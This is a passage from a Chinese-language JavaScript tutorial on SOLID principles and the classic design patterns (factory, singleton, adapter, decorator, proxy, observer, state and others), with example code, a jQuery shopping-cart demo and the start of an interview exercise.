2、O（Open Closed Principle）——开放封闭原则面向对象的核心对扩展开放，对修改封闭增加需求时，扩展新代码，而非修改已有代码 3、L（Liskov Substitution Principle, LSP）——李氏置换原则子类能覆盖父类父类能出现的地方子类就能出现js中使用功能较少（弱类型 &amp; 继承使用较少） 4、I (Interface Segregation Principle)——接口独立原则保持接口的单一独立js中没有接口概念（typescript例外）类似单一职责原则，这里更关注接口 5、D（Dependence Inversion Principle ,DIP）——依赖倒置原则面向接口编程，依赖于抽象而不依赖于具体使用方只关注接口而不关注具体类的实现js中使用较少（没有接口概念，弱类型） 从设计到模式设计：设计原则（统一指导思想）模式：通过概念总结出的一些模板，可以效仿的固定式的东西（根据指导思想结合开发经验，总结出固定的样式或模板） 设计模式分类: 23种设计模式，分为创建型、结构型、行为型。1、创建型（对象的创建及生成）工厂模式（工场方法模式、抽象工场模式、建造者模式）、单例模式、原型模式 2、组合型（对象和类是怎样的组合形式，一个类不一定能满足需求，通过组合的形式完成）适配器模式、装饰器模式、代理模式、外观模式、桥接模式、组合模式、享元模式 3、行为型（涵盖了开发中的一些常用的行为，如何设计才能满足需求）观察者模式、迭代器模式、策略模式、模板方法模式、职责连模式、状态模式、命令模式、备忘录模式、中介者模式、访问者模式、解释器模式 4、其他设计模式(从上面三类中不常用的抽取出而来)原型模式、桥接模式、组合模式、享元模式、策略模式、模板方法模式、职责链模式、命令模式、备忘录模式、中介者模式、访问者模式 创建型工厂模式 Factory工厂模式的作用就有一个，将生成对象的new 方法用一个函数封装起来。 举例: 去购买汉堡，直接点餐、取餐，不会自己亲手做，商店要 封装 做汉堡的工作，做好直接给消费者。 123456789101112131415161718192021222324// factory.jsclass Product &#123; constructor(name) &#123; this.name = name &#125; fn1() &#123; console.log(`fn1`) &#125; fn2() &#123; console.log(`fn2`) &#125;&#125;class Creator &#123; create(name) &#123; return new Product(name) &#125;&#125;// testlet creator = new Creator()let p = creator.create('p')p.fn1()p.fn2() 场景: jQuery的$，其实就是返回的new jQuery.fn.init(selector, context) React.createElement vue 异步组件12345678// React.createElementclass Vnode(tag, attrs, children) &#123; // ...&#125;React.createElement = function(tag, attrs, children) &#123; return new Vnode(tag, attrs, children)&#125; 单例模式 Sigleton单例就是保证一个类只有一个实例，实现的方法一般是先判断实例存在与否，如果存在直接返回，如果不存在就创建了再返回，这就确保了一个类只有一个实例对象。在js里，单例作为一个命名空间提供者，从全局命名空间里提供一个唯一的访问点来访问该对象 举例: jquery中的$是单例模式， jQuery只有一个$、 购物车、 登录框、 vuex和redux中的store12345678910111213141516171819202122232425262728293031// singleton.jsclass SingleObject &#123; // 在这里面定义的方法非静态，初始化实例时，都会有 saySth()这个方法 saySth() &#123; console.log('blabla') &#125;&#125;// 静态方法，将方法挂载到class上面,无论SingleObject被new多少个，getInstance的方法只有一个SingleObject.getInstance = (function() &#123; let instance return function() &#123; // 如果没有则赋值，初始化 if(!instance) &#123; instance = new SingleObject() &#125; // 有的话直接返回 return instance &#125;&#125;())// test// 这里只能使用静态函数getInstance,不能使用new SingleObject()let obj1 = SingleObject.getInstance()obj1.saySth()let obj2 = SingleObject.getInstance()obj2.saySth()console.log(obj1===obj2) // 测试是否一个实例 true 场景: jquery中的$是单例模式， jQuery只有一个$ 模拟登录框 vuex和redux中的store123456789// jquery中的$是单例模式， jQuery只有一个$if(window.jQuery!=null) &#123; return window.jQuery&#125; else &#123; // 初始化&#125;// 模拟登录框// 类似上面的SingleObject 组合型适配器模式 Adpate将旧接口和使用者进行分离，使用一个类为不同类方法提供统一的适配转换接口，从而达到适配的目的，所以核心思想也就是为了解决接口不兼容问题。 举例: 新旧接口不兼容、封装旧接口、插头转换、兼容没有jquery的ajax方法、vue的computed1234567891011121314151617181920212223242526272829303132333435// adpate.jsclass Adpatee &#123; specificRequest() &#123; return '俄罗斯标准插头' &#125;&#125;class Target &#123; constructor() &#123; this.adaptee = new Adpatee() &#125; request() &#123; let info = this.adaptee.specificRequest() return `$&#123;info&#125; - 转换器 - 中国标准插头` &#125;&#125;// testlet target = new Target()let res = target.request()console.log(res)// 注意，Target也可以写成class Target1 &#123; constructor(adaptee) &#123; this.adaptee = adaptee &#125; request() &#123; let info = this.adaptee.specificRequest() return `$&#123;info&#125; - 转换器 - 中国标准插头` &#125;&#125;// testlet res1 = new Target1(new Adpatee()).request()console.log(res1) 适配器模式的出现，都是为了去解决一些不得不兼容的接口或者方法，其实这样的例子有很多：比如我们写一个兼容没有jquery的ajax方法12345var $ = &#123; ajax: function(options) &#123; return ajax(options) &#125;&#125; 装饰器模式 Decorator既能使用原有的功能，又能使用装饰后的功能。为对象添加新功能，不改变其原有的结构和功能。 举例，比如手机可以打电话、发短信，我们在原有的基础上装个保护壳，防止摔落时损坏1234567891011121314151617181920212223242526// decorator.jsclass Circle &#123; draw() &#123; console.log('draw sth') &#125;&#125;class Decorator &#123; constructor(circle) &#123; this.circle = circle &#125; draw() &#123; this.circle.draw() this.setRedBorder(circle) &#125; setRedBorder() &#123; console.log('decorate with red border') &#125;&#125;// testlet circle = new Circle()circle.draw()let dec = new Decorator(circle)dec.draw() ES7装饰器，考虑到浏览器兼容问题，需要安装插件支持1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859npm i @babel/plugin-proposal-decorators--save-dev// package.json"plugins": [ ["@babel/plugin-proposal-decorators", &#123;"legacy": true&#125;], // 要放在第一行 ["@babel/plugin-proposal-class-properties", &#123;"loose": true&#125;]]// 对babel进行配置// Experimental support for decorators is a feature that is subject to change in a future release// fix: In VSCode, Add "javascript.implicitProjectConfig.experimentalDecorators": true to the file and it should fix it. // tsconfig.json"compilerOptions": &#123; "experimentalDecorators": true // 启用实验性的ES装饰器&#125;// 之后就可以使用装饰器了@testclass A &#123;&#125;function test(flag) &#123; flag.val = true&#125;alert(A.val)// 还可以加参数@test(true)class B &#123;&#125;function test(flag) &#123; // 这里面返回一个函数,装饰器返回的都是一个函数 return function(target) &#123; target.val = flag &#125;&#125;alert(B.val)// 装饰器的原理 - 装饰类@decorator // @关键字使用装饰器class C &#123;&#125;// 等同于class C &#123;&#125;C = decorator(C) || C // 将A定义成decorator函数执行一遍的返回值(相当于A在decorator执行了一遍)，没有的话返回A// 装饰器的原理 - 装饰方法class C&#123; @decorator props()&#123;&#125;&#125;props = decorator(C.prototype, 'props', &#123; value: props, enumerable: false, configurable: true, writable: true&#125;) 装饰类 - mixin1234567891011121314151617function mixins(...list) &#123; return function(target) &#123; Object.assign(target.prototype, ...list) &#125;&#125;const Foo = &#123; foo() &#123; alert('foo') &#125;&#125;@mixins(Foo)class D &#123;&#125;let obj = new D()obj.foo() 装饰方法 - 增加打印日志123456789101112131415161718192021// logclass Math &#123; @log add(a, b) &#123; return a+b &#125;&#125;// 修饰器第一个参数是类的原型对象，修饰器的本意是要“修饰”类的实例，但是这个时候实例还没生成，所以只能去修饰原型（这不同于类的修饰，那种情况时target参数指的是类本身）；第二个参数是所要修饰的属性名，第三个参数是该属性的描述对象function log(target, name, descriptor) &#123; let oldVal = descriptor.value descriptor.value = function () &#123; console.log('the result is ') return oldVal.apply(this, arguments) &#125; return descriptor&#125;let math = new Math()let res_log = math.add(2, 3)console.log(res_log) 推荐使用 core-decorators 库，有诸如 readonly、deprecate 等装饰类和方法123456789101112131415npm i core-decorators --save// core-decoratorsimport &#123; readonly &#125; from 'core-decorators'class CoreDecorators &#123; @readonly show() &#123; return 'it is read only' &#125;&#125;let cd = new CoreDecorators()console.log(cd.show())cd.show = function() &#123;&#125; // Cannot assign to read only property 'name' of object '#&lt;CoreDecorators&gt;' 代理模式 Proxy使用者无法直接访问目标对象，中间加代理，通过代理做授权和控制。要注意的是，提供的方法一定要和服务端默认的方法名字是一样的。 举例: 科学上网(无论开不开代理，要访问的网址一直没有变，唯一的区别是，没有开代理的情况，无法直接访问到。如果开了代理，会通过代理去访问数据，再返回)、明星经纪人、nginx的正向代理和反向代理 使用场景: 网页事件代理、this的指向、$.proxy、ES6 Proxy1234567891011121314151617181920212223242526// 代理模式class RealSite &#123; constructor(fileName) &#123; this.fileName = fileName this.loadFromDisk() &#125; loadFromDisk() &#123; console.log(`loading... $&#123;this.fileName&#125;`) &#125; display() &#123; console.log(`display... $&#123;this.fileName&#125;`) &#125;&#125;class ProxySite &#123; constructor(fileName) &#123; this.realFile = new RealSite(fileName) &#125; display() &#123; this.realFile.display() &#125;&#125;// testlet proxyFile = new ProxySite('1.txt')proxyFile.display() jquery 的 $.proxy12345678910111213// 使用 $.proxy $('#div').click(function() &#123; setTimeout($.proxy(function() &#123; $(this).addClass('blue') &#125;, this), 1000);&#125;)// 等同于$('#div').click(function() &#123; let _this = this setTimeout(() =&gt; &#123; $(_this).addClass('blue') &#125;, 1000);&#125;) ES6 Proxy 实现 明星经纪人123456789101112131415161718192021222324252627282930313233// 明星let star = &#123; name: 'Justin Bieber', age: 24, phone: 666&#125;// 经纪人let agent = new Proxy(star, &#123; get: function(target, key) &#123; if(key==='phone') &#123; return 888 &#125; if(key==='price') &#123; return 12000 &#125; return target[key] &#125;, set: function(target, key, value) &#123; if(key==='customPrice') &#123; if(value&lt;10000) &#123; throw Error('too low price') &#125; else &#123; target[key] = value &#125; &#125; &#125;&#125;)// testconsole.log(agent.name, agent.phone, agent.price)agent.customPrice = 20001console.log(agent.customPrice) 代理模式、适配模式、装饰器模式三者的区别适配器：提供一个不同的接口（进行格式的转换）代理模式：提供一模一样的接口（无权使用目标类，所以进行代理） 装饰器模式：扩展功能，原有功能不变且可直接使用代理模式：显示原有功能，但是经过限制或阉割之后的 外观模式 Facade为子系统中的一组接口提供了一个高层接口，使用者使用了这个高层接口 不符合单一职责和开放封闭原则，因此谨慎使用，不可滥用（不要为了设计而设计，而是为了使用而设计）123456789101112// facade.jsfunction facade(ele, type, selector, fn) &#123; if(fn==null) &#123; fn = selector selector = null &#125; // ...&#125;// 调用facade(ele, 'click', '#div1', fn)facade(ele, 'click', fn) 行为型观察者模式 / 订阅发布模式一堆观察者或者订阅者去观察或者订阅一个主题，当这个主题变化时，就会通知所监听或者观察它的订阅者 发布、订阅（订好咖啡，会有人上门送），一对 N（可以同时订购牛奶，报纸等，之间无冲突）123456789101112131415161718192021222324252627282930313233343536373839404142434445// 主题，保存状态，接收状态变化，状态变化后触发所有观察者对象class Subject &#123; constructor() &#123; this.state = 0 this.observers = [] &#125; getState() &#123; return this.state &#125; setState(state) &#123; this.state = state this.notifyAllObservsers() &#125; // 循环所有的观察者 notifyAllObservsers() &#123; this.observers.forEach(observer =&gt; &#123; // 遍历的每个元素执行update方法 observer.update() &#125;) &#125; // 添加一个新的观察者 attach(observer) &#123; this.observers.push(observer) &#125;&#125;// 观察者/订阅者, 等待被触发class Observer &#123; constructor(name, subject) &#123; this.name = name this.subject = subject // 将自己添加进去，把观察者添加到主题当中 this.subject.attach(this) &#125; update() &#123; console.log(`name: $&#123;this.name&#125; - state: $&#123;this.subject.getState()&#125;`) &#125;&#125;// testlet sub = new Subject()let obs1 = new Observer('obs1', sub)let obs2 = new Observer('obs2', sub)sub.setState(2)sub.setState(3) 场景1、网页事件绑定，所有的事件监听都是观察者模式，所有事件写好(订阅)之后，等待被执行12&lt;button id="bth"&gt;btn&lt;/button&gt;$('#btn').click(() =&gt; &#123;&#125;) // 当按钮点击触发 2、Promise then, promise 状态变化resolve reject pending3、$.Callbacks()4、一切生命周期或者hook之类的函数都是观察者5、nodejs 中应用广泛，如 自定义事件 event、stream、readline、处理http请求、vue和react组件声明周期触发、watch12345678910111213141516171819// EventEmitterconst EventEmitter = require('events').EventEmitterclass Poodle extends EventEmitter &#123; constructor(name) &#123; super() this.name = name &#125;&#125;let poodle = new Poodle('poodle')poodle.on('bark', function() &#123; console.log(`$&#123;this.name&#125; bark`)&#125;)poodle.on('bark', function() &#123; console.log(`$&#123;this.name&#125; bark again`)&#125;)poodle.emit('bark') 迭代器模式 Iterator和平时所用的for循环类似，遍历具有一组特殊接口的对象或者是特殊函数，顺序访问一个集合（有序列表，数组，对象是个无序列表），使用者无需知道集合的内部结构123456789101112131415161718192021222324252627282930313233343536// iterator.jsclass Interator &#123; constructor(container) &#123; this.list = container.list this.index = 0 &#125; next() &#123; if(this.hasNext()) &#123; return this.list[this.index++] &#125; return null &#125; hasNext() &#123; if(this.index &gt;= this.list.length) &#123; return false &#125; return true &#125;&#125;class Container &#123; constructor(list) &#123; this.list = list &#125; getIterator() &#123; return new Interator(this) &#125;&#125;// testlet arr = [2 ,3 ,5, 7]let container = new Container(arr)let iterator = container.getIterator()while(iterator.hasNext()) &#123; console.log(iterator.next()) &#125; 场景:jq 的 each()、 ES6 Itearator、 Generator 函数返回结果123456789101112function each(data) &#123; // 转换成 jq 对象， 生成迭代器 var $data = $(data) $data.each(function(key, val) &#123; console.log(key, val) &#125;)&#125;// 之后即统一了多种不同数据接口的遍历方式each([2, 3, 5])each($('a'))each(nodeList) ES6 Iterator原生具备 Iterator 接口的数据结构: Array、Map、Set、String、TypedArray、函数的 arguments 对象、NodeList 对象。以上，都部署了 Symbol.iterator 属性的数据结构，就称为部署了遍历器接口1234567891011121314151617181920212223242526// 传入的data可以是任意的function each_es6(data) &#123; // 生成遍历器 let iterator = data[Symbol.iterator]() let item = &#123;done: false&#125; while(!item.done) &#123; item = iterator.next() if(!item.done) &#123; console.log(item.value) &#125; &#125;&#125;let arr2 = [2, 3]each_es6(arr2)// for of function each_forof(data) &#123; // 有 Symbol.iterator 属性的数据结构 for(let val of data) &#123; console.log(val) &#125;&#125;each_forof(arr2) 状态模式 State一个对象有多个状态变化，每次状态变化都会触发相应的操作, 不能总是用if…else来控制。当我们把这些固定套路的代码抽象出来的时候，就叫做状态模式，有的程序把状态也叫做状态机。 将状态对象和主题对象分离，状态的变化逻辑单独处理 示例，交通信号灯不同颜色的变化12345678910111213141516171819202122232425262728293031323334353637383940414243// state.js// 把状态抽象出来 状态（红绿灯）class State &#123; constructor(color) &#123; this.color = color &#125; handle(context) &#123; console.log(`turn to light $&#123;this.color&#125;`) // 设置状态 context.setState(this) &#125;&#125;// 主体 实例class Context &#123; constructor() &#123; this.state = null &#125; // 获取状态 getState() &#123; return this.state &#125; setState(state) &#123; this.state = state &#125;&#125;// testlet context = new Context()let green = new State('green')let red = new State('red')let yellow = new State('yellow')// greengreen.handle(context)console.log(context.getState())red.handle(context)console.log(context.getState())yellow.handle(context)console.log(context.getState()) 场景:1、有限状态机。有限个状态、以及在这些状态之间的变化第三方库，npm i javascript-state-machine –save-dev 2、实现简单的 Promisepromise 是个 class; 在初始化的时候传进去一个函数，函数有2个参数resolve、reject; 要实现then的方法，then接收2个参数成功和失败123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import StateMachine from 'javascript-state-machine';// 状态机模型let fsm = new StateMachine(&#123; init: 'pending', transitions: [ &#123; name: 'resolve', // 事件名称 from: 'pending', to: 'fullfilled' &#125;, &#123; name: 'reject', // 事件名称 from: 'pending', to: 'rejected' &#125; ], methods: &#123; onResolve(state, data) &#123; // state 当前状态机实例; data fsm.resolve(param) 传递的参数 data.successList.forEach(fn =&gt; fn()) &#125;, onRejeact(state, data) &#123; // state 当前状态机实例; data fsm.reject(param) 传递的参数 data.failList.forEach(fn =&gt; fn()) &#125; &#125;&#125;)// 定义 Promiseclass MyPromise &#123; constructor(fn) &#123; this.successList = [] this.failList = [] fn(() =&gt; &#123; // 箭头函数绑定this指向, 普通函数需做缓存 // resolve fsm.resolve(this) &#125;, () =&gt; &#123; // reject fsm.reject(this) &#125;) &#125; then(successFn, failFn) &#123; this.successList.push(successFn) this.failList.push(failFn) &#125;&#125;// testfunction loadImg(src) &#123; let promise = new MyPromise(function(resolve, reject) &#123; let img = document.createElement('img') img.onload = function() &#123; resolve(img) &#125; img.onerror = function() &#123; reject() &#125; img.src = src &#125;) return promise&#125;let src= 'https://s3.amazonaws.com/cdn-origin-etr.akc.org/wp-content/uploads/2017/11/01142236/Poodle-Care1.jpg'let result = loadImg(src)result.then(function() &#123; console.log('ok1')&#125;, function() &#123; console.log('fail1') &#125;)result.then(function() &#123; console.log('ok2') &#125;, function() &#123; console.log('fail2') &#125;) 其他设计模式创建型(原型模式)组合型(桥接模式、组合模式、享元模式)行为型(策略模式、模板方法模式、职责链模式、命令模式、备忘录模式、中介者模式、访问者模式、 解释器模式) 原型模式clone自己，生成一个新对象（重新new一个对象，开销相对较大）Object.create(proto)123456789101112131415161718192021const prototype = &#123; getName() &#123; return this.first + this.last &#125;, sayHi() &#123; console.log('hello') &#125;&#125;// 基于原型创建aalet aa = Object.create(prototype)aa.first = 'a'aa.last = 'a'let name = aa.getName()console.log(name)// 基于原型创建bblet bb = Object.create(prototype)bb.first = 'b'bb.last = 'b'bb.sayHi() 桥接模式用于把抽象化和实现化解耦, 使得二者可以独立变化。如画红色/黄色的圆形/三角形，把颜色和形状分开12345678910111213141516171819202122232425262728293031323334353637383940// 普通实现class ColorShape &#123; yellowCircle() &#123; console.log('yellow circle') &#125; redCircle() &#123; console.log('red circle') &#125; yellowTriangle() &#123; console.log('yellow triangle') &#125; redTriangle() &#123; console.log('red triangle') &#125;&#125;// 使用桥接模式class Color &#123; constructor(name) &#123; this.name = name &#125;&#125;class Shape &#123; constructor(name, color) &#123; this.name = name this.color = color &#125; draw() &#123; console.log(`$&#123;this.color.name&#125; $&#123;this.name&#125;`) &#125;&#125;// testlet red = new Color('red')let yellow = new Color('yellow')let circle = new Shape('circle', red)circle.draw()let triangle = new Shape('triangle', yellow)triangle.draw() 组合模式生成树形结构，表示”整体—部分”关系, 让整体和部分都具有一致的操作方式和数据结构举例，文件夹的文件、DOM Node 享元模式共享内存（主要考虑内存，而非效率），相同数据，共享使用举例，事件代理到父级(子数据要相同、数量很多) 策略模式不同策略（执行方式）分开处理，避免出现大量 if…else12345678910111213141516171819202122232425262728293031323334353637383940414243444546class User &#123; constructor(type) &#123; this.type = type &#125; buy() &#123; if(this.type==='ordinary') &#123; console.log('ordinary') &#125; else if(this.type==='member') &#123; console.log('member') &#125; if(this.type==='vip') &#123; console.log('vip') &#125; &#125;&#125;// testlet user1 = new User('ordinary')user1.buy()let user2 = new User('member')user2.buy()let user3 = new User('vip')user3.buy()// 使用策略模式class OrdinaryUser &#123; buy() &#123; console.log('ordinary') &#125;&#125;class MemberUser &#123; buy() &#123; console.log('member') &#125;&#125;class VipUser &#123; buy() &#123; console.log('vip') &#125;&#125;let user4 = new OrdinaryUser()user4.buy()let user5 = new MemberUser()user5.buy()let user6 = new VipUser()user6.buy() 模板方法模式通过一个方法将多个方法其封装合并，统一输出，调用时使用该方法即可1234567891011class Template &#123; handle() &#123; this.handle1() this.handle2() this.handle3() &#125; handle1() &#123;&#125; handle2() &#123;&#125; handle3() &#123;&#125;&#125; 职责链模式一步操作可能分为多个职责角色来完成，把这些角色都分开，然后用一个链式串起来，将发起者和各个处理者进行隔离 场景: jq 链式操作、 promise.then() 链式操作123456789101112131415161718192021222324// 文件审批，依次市长、州长、总统class ResponsibilityChain &#123; constructor(name) &#123; this.name = name this.nextChain = null &#125; setNextChain(chain) &#123; this.nextChain = chain &#125; handle() &#123; console.log(`$&#123;this.name&#125; 审批`) if(this.nextChain != null) &#123; this.nextChain.handle() &#125; &#125;&#125;// testlet resp1 = new ResponsibilityChain('mayor')let resp2 = new ResponsibilityChain('governor')let resp3 = new ResponsibilityChain('president')resp1.setNextChain(resp2)resp2.setNextChain(resp3)resp1.handle() 命令模式执行命令时，发布者和执行者分开，中间加入命令对象，作为中转站 场景: 网页富文本编辑器操作，浏览器封装了一个命令对象，如 document.execCommand(‘bold’)12345678910111213141516171819202122232425262728293031323334// 接收者class Receiver &#123; exec() &#123; console.log('执行命令') &#125;&#125;// 传达者class Command &#123; constructor(receiver) &#123; this.receiver = receiver &#125; cmd() &#123; console.log('传达命令') this.receiver.exec() &#125;&#125;// 触发者class Invoker &#123; constructor(commamd) &#123; this.commamd = commamd &#125; invoke() &#123; console.log(`决策命令`) this.commamd.cmd() &#125;&#125;// testlet soldier = new Receiver()let trumpeter = new Command(soldier)let general = new Invoker(trumpeter)general.invoke() 备忘录模式随时记录一个对象的状态变化，随时可以恢复之前的某个状态（如备份、撤销、保存副本功能） 类似富文本编辑器的获取和保存内容12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758class Memento &#123; constructor(content) &#123; this.content = content &#125; getContent() &#123; return this.content &#125;&#125;// 备忘列表 内容是Memento类的实例class CareTaker &#123; constructor() &#123; this.list = [] &#125; add(memento) &#123; this.list.push(memento) &#125; get(index) &#123; return this.list[index] &#125;&#125;// 编辑器class Editor &#123; constructor() &#123; this.content = null &#125; setContent(content) &#123; this.content = content &#125; getContent() &#123; return this.content &#125; // 保存、备份 saveContentToMemento() &#123; return new Memento(this.content) &#125; // 恢复、撤销 getContentFromMemento(memento) &#123; this.content = memento.getContent() &#125;&#125;// testlet editor = new Editor()let careTaker = new CareTaker()editor.setContent('aaa')editor.setContent('bbb')careTaker.add(editor.saveContentToMemento())editor.setContent('ccc')careTaker.add(editor.saveContentToMemento())editor.setContent('ddd')console.log(editor.getContent()) // dddeditor.getContentFromMemento(careTaker.get(1))console.log(editor.getContent()) // ccceditor.getContentFromMemento(careTaker.get(0))console.log(editor.getContent()) // bbb 中介者模式将各关联对象，通过中介者隔离类似出租、租房，通过中介12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 中介class Mediator &#123; constructor(owner, renter) &#123; this.owner = owner this.renter = renter &#125; setOwner() &#123; let price = this.renter.price this.owner.setPrice(price * 10) &#125; setRenter() &#123; let price = this.owner.price this.renter.setPrice(price / 10) &#125;&#125;// 业主class Owner &#123; constructor() &#123; this.price = 0 &#125; setPrice(price, mediator) &#123; this.price = price if(mediator) &#123; mediator.setRenter() &#125; &#125;&#125;// 租客class Renter &#123; constructor() &#123; this.price = 0 &#125; setPrice(price, mediator) &#123; this.price = price if(mediator) &#123; mediator.setOwner() &#125; &#125;&#125;let owner = new Owner()let renter = new Renter()let mediator = new Mediator(owner, renter)owner.setPrice(100, mediator)console.log(owner.price, renter.price)renter.setPrice(100, mediator)console.log(owner.price, renter.price) 访问者模式将数据操作和数据结构进行分离 解释器模式描述语言语法如何定义，如何解释和编译，用于专业场景 综合应用介绍和演示使用 jQuery 做一个模拟购物车的示例要点：显示购物车列表、加入购物车、从购物车删除模式：工厂 – $() 使用jq 、创建商品单例 – 购物车装饰器 – 打印日志观察者 – 网页事件 click、 promise状态 – StateMachine 添加到购物车、从购物车删除模板方法 – init()方法 内容/按钮/渲染代理 – 折扣商品信息处理 proxy 设计方案UML 类图 基础环境1234567891011121314151617181920212223242526272829303132333435363738394041424344// package.jsondevServer: &#123; contentBase: path.join(__dirname, './release'), // 根目录 open: true, // 自动打开浏览器 port: 8001, proxy: &#123; '/api/*': &#123; target: 'http://localhost:8002' // devServer 将 /api/* 的请求都代理映射到 http://localhost:8002/api/* 的端口上 &#125; &#125;&#125;cd srclive-server --port=8002 --host=localhost 启动 8002 的服务浏览器打开 http://localhost:8002/api/list.json 启动后端服务直接访问浏览器打开 http://localhost:8001/api/list.json 通过代理，前端访问npm i jquery --save 安装 jq// 整理目录，移动 原有src/ 下设计模式相关js文件，为 /release 下文件// index.html 替换原有内容 为 #app 的节点// &lt;div id="app&gt;&lt;/div&gt;// 创建 src 下的 shop 文件夹 为本综合示例 项目文件// src/index.jsimport App from './shop/App'let app = new App('app')app.init()// src/shop/App.jsclass App &#123; constructor(id) &#123; &#125; init() &#123; &#125;&#125;export default App 具体实现index -&gt; App -&gt; List组件 -&gt; Item -&gt; Cart -&gt; ShoppingCart index.js12345// index.jsimport App from './shop/App'let app = new App('app')app.init() App1234567891011121314151617181920212223242526// src/shop/App.jsimport $ from 'jquery'import ShoppingCart from './ShoppingCart/ShoppingCart'import List from './List/List'class App &#123; constructor(id) &#123; this.$el = $('#'+id) &#125; init() &#123; this.initShoppingCart() this.initList() &#125; // 初始化购物车 initShoppingCart() &#123; let shoppingCart = new ShoppingCart(this) shoppingCart.init() &#125; // 初始化购列表 initList() &#123; let list = new List(this) list.init() &#125;&#125;export default App List12345678910111213141516171819202122232425262728293031323334353637383940// src/shop/List/List.jsimport $ from 'jquery'import &#123; GET_LIST &#125; from '../config/config'import createItem from './CreateItem'export default class List &#123; constructor(app) &#123; this.app = app this.$el = $('&lt;div&gt;') &#125; init() &#123; this.loadData().then(data =&gt; &#123; this.initItemList(data) &#125;).then(() =&gt; &#123; this.render() &#125;) &#125; // 获取数据 loadData() &#123; // 返回 Promise 实例 // 观察者模式 return fetch(GET_LIST).then(result =&gt; &#123; return result.json() &#125;) &#125; // 生成列表 initItemList(data) &#123; data.map(itemData =&gt; &#123; // 创建一个 item 然后 init let item = createItem(this, itemData) item.init() return item &#125;) &#125; // 渲染 render() &#123; this.app.$el.append(this.$el) &#125;&#125; Item12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091// src/shop/List/Item.jsimport $ from 'jquery'import getCart from '../ShoppingCart/GetCat'import StateMachine from 'javascript-state-machine'import log from '../utils/log'export default class Item &#123; constructor(list, data) &#123; this.list = list this.data = data this.$el = $('&lt;div&gt;') this.cart = getCart() &#125; // 模板方法模式 通过一个方法将多个方法其封装合并，统一输出 init() &#123; this.initContent() this.initBtn() this.render() &#125; initContent() &#123; let $el = this.$el let data = this.data $el.append($(`&lt;p&gt;名称：$&#123;data.name&#125;&lt;/p&gt;`)) $el.append($(`&lt;p&gt;价格：$&#123;data.price&#125;&lt;/p&gt;`)) &#125; initBtn() &#123; let $el = this.$el let $btn = $(`&lt;button&gt;`) let _this = this // 状态模式 let fsm = new StateMachine(&#123; init: '加入购物车', transitions: [ &#123; name: 'addToCart', from: '加入购物车', to: '从购物车删除' &#125;, &#123; name: 'deleteFromCart', from: '从购物车删除', to: '加入购物车' &#125; ], methods: &#123; onAddToCart() &#123; _this.addToCartHandle() updateText() &#125;, onDeleteFromCart() &#123; _this.delFromCartHandle() updateText() &#125; &#125; &#125;) function updateText() &#123; $btn.text(fsm.state) &#125; $btn.click(() =&gt; &#123; // 添加到购物车、从购物车删除 if(fsm.is('加入购物车')) &#123; fsm.addToCart() &#125; else &#123; fsm.deleteFromCart() &#125; &#125;) updateText() $el.append($btn) &#125; // 添加到购物车 // 装饰器模式 @log('add') addToCartHandle() &#123; this.cart.add(this.data) &#125; // 从购物车删除 // 装饰器模式 @log('del') delFromCartHandle() &#123; this.cart.del(this.data.id) &#125; render() &#123; this.list.$el.append(this.$el) &#125;&#125; CreateItem12345678910111213141516171819202122232425// src/shop/List/CreateItem.jsimport Item from './Item';// 工厂模式export default function(list, itemData) &#123; if(itemData.discount) &#123; itemData = createDiscount(itemData) &#125; return new Item(list, itemData)&#125;// 代理模式 做折扣显示function createDiscount(itemData) &#123; return new Proxy(itemData, &#123; get(target, key, receiver) &#123; if(key === 'name') &#123; return `$&#123;target[key]&#125; 【折扣】` &#125; if(key === 'price') &#123; return target[key] * 0.8 &#125; return target[key] &#125; &#125;)&#125; CreateItem1234567891011121314151617181920212223242526272829// src/shop/ShoppingCart/ShoppingCart.jsimport $ from 'jquery'import GetCat from './GetCat'export default class ShoppingCart &#123; constructor(app) &#123; this.app = app this.cart = GetCat() this.$el = $('&lt;div&gt;').css(&#123;'padding-bottom': '10px', 'border-bottom': '2px solid #ccc'&#125;) &#125; init() &#123; this.initBtn() this.render() &#125; initBtn() &#123; let $btn = $('&lt;button&gt;购物车&lt;/button&gt;') $btn.click(() =&gt; &#123; this.showCart() &#125;) this.$el.append($btn) &#125; showCart() &#123; alert(this.cart.getList()) &#125; render() &#123; this.app.$el.append(this.$el) &#125;&#125; GetCat123456789101112131415161718192021222324252627282930313233343536// src/shop/ShoppingCart/GetCat.jsclass Cart &#123; constructor() &#123; this.list = [] &#125; add(data) &#123; this.list.push(data) &#125; del(id) &#123; this.list = this.list.filter(item =&gt; &#123; if(item.id === id) &#123; return false &#125; return true &#125;) &#125; getList() &#123; return this.list.map(item =&gt; &#123; return item.name &#125;).join('\n') &#125;&#125;// 返回单例let getCart = (function() &#123; let cart return function() &#123; if(!cart) &#123; cart = new Cart &#125; return cart &#125;&#125;)()export default getCart 其他1234567891011121314151617181920212223242526272829303132333435// src/shop/utils/log.js// 装饰器 打印日志export default function(type) &#123; return function(target, name, descriptor) &#123; let oldValue = descriptor.value descriptor.value = function() &#123; // 再次统一打印日志 console.log(`日志上报 $&#123;type&#125;`) // 执行原有方法 return oldValue.apply(this, arguments) &#125; return descriptor &#125;&#125;// src/shop/config/config.jsexport const GET_LIST = '/api/list.json'// src/api/list.json 假数据[ &#123; "id": 1, "name": "观察者模式", "price": 200, "discount": 1 &#125;, &#123; "id": 2, "name": "装饰器模式", "price": 300, "discount": 0 &#125;] 面试题第一题打车时，可以打专车或者快车。任何车都有车牌号和名称。不同车价格不同，快车每公里 1 元，专车每公里 2 元。行程开始时，显示车辆信息行程结束时，显示打车金额（假定行程就 5 公里） UML 类图1234567891011121314151617181920212223242526272829303132333435363738// /review1.jsclass Car &#123; constructor(name, number) &#123; this.name = name this.number = number &#125;&#125;class FastCar extends Car &#123; constructor(name, number) &#123; super(name, number) this.price = 1 &#125;&#125;class SpecialCar extends Car &#123; constructor(name, number) &#123; super(name, number) this.price = 2 &#125;&#125;class Trip &#123; constructor(car) &#123; this.car = car &#125; showCarInfo() &#123; console.log(`THe car is $&#123;this.car.name&#125;, number is $&#123;this.car.number&#125;`) &#125; showFare() &#123; console.log(`THe price is $&#123;this.car.price * 5&#125;`) &#125;&#125;let car = new FastCar('wuling', 001)let trip = new Trip(car)trip.showCarInfo()trip.showFare() 第二题某停车场，分 